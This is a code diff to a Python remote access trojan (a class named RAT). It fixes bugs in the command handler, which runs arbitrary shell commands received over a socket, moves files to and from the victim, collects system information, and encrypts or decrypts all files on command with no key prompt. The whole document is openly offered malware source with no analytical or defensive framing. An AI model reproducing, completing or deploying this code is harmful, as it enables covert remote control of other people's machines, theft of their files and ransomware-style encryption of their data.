@@ -163,8 +163,8 @@ class RAT:
 					stdoutput = stdoutput.decode('gbk').encode('utf-8')
 					cls.send(stdoutput)
 				if(data == 'terminate'):
-					break
 					cls.kill()
+					break
 
 			except socket.error as e:
 				cls.socket_handler(e)
@@ -238,29 +238,25 @@ class RAT:
 					pass
 		# check for download
 		elif(data.startswith('download ')):
-			std = upload(data[9:])
+			std = cls.upload(data[9:])
 		# check for upload
 		elif(data.startswith('upload ')):
-			std = download(data[7:])
+			std = cls.download(data[7:])
 		# send system info
 		elif(data.startswith('sys_info')):
 			std = cls.drill_down()
 		# encrypt all data
 		elif(data.startswith('encrypt_all')):
-			key = raw_input("Enter Key: ")
-			std = cls._raw.handler(data, key)
+			std = cls._raw.handler(data, "ea")
 		# encrypt data 
-		elif(data.startswith('encrypt')):
-			key = raw_input("Enter Key: ")
-			std = cls._raw.handler(data, key)
+		elif(data.startswith('encrypt ')):
+			std = cls._raw.handler(data[8:], "e")
 		# decrypt all data
 		elif(data.startswith('decrypt_all')):
-			key = raw_input("Enter Key: ")
-			std = cls._raw.handler(data, key)
+			std = cls._raw.handler(data, "da")
 		# decrypt data 
-		elif(data.startswith('decrypt')):
-			key = raw_input("Enter Key: ")
-			std = cls._raw.handler(data, key)
+		elif(data.startswith('decrypt ')):
+			std = cls._raw.handler(data[8:], "d")
 		# bind a shell subprocess  
 		else:
 			proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
